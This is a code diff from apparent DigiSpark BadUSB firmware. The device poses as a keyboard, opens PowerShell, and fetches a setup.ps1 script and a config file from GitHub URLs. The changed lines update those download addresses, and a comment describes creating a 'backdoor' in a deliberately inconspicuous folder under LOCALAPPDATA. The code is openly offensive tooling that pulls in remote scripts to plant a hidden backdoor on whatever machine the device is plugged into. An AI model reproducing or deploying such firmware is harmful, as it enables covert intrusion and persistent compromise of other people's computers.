@@ -5,8 +5,8 @@
 
 const int START_DELAY = 1000; // The amount of time in millis to wait for the computer to identify it as a keyboard.
 const int OPEN_DELAY = 1000; // How much time to wait to assure that the powershell is well open.
-const char SETUP_FILE_URL[] = "https://raw.githubusercontent.com/daBest222/ExplDigiSpark-PowerShell-Script-and-Code-Launcher/Scripts/setup.ps1"; // Where your .ps1 setup file is.
-const char CONFIG_FILE_URL[] = "https://raw.githubusercontent.com/daBest222/ExplDigiSpark-PowerShell-Script-and-Code-Launcher/Scripts/config.jsonc"; // Where your config.jsonc file is.
+const char SETUP_FILE_URL[] = "https://raw.githubusercontent.com/daBest222/DigiSpark-PowerShell-Script-and-Code-Launcher/main/Scripts/setup.ps1"; // Where your .ps1 setup file is.
+const char CONFIG_FILE_URL[] = "https://raw.githubusercontent.com/daBest222/DigiSpark-PowerShell-Script-and-Code-Launcher/main/Scripts/config.jsonc"; // Where your config.jsonc file is.
 const char FOLDER_NAME[] = "$env:LOCALAPPDATA\AppMaintenanceCache"; // Where to create your backdoor. I used the LocalAppData folder with an inconspicuous folder name.
 
 void setup() {
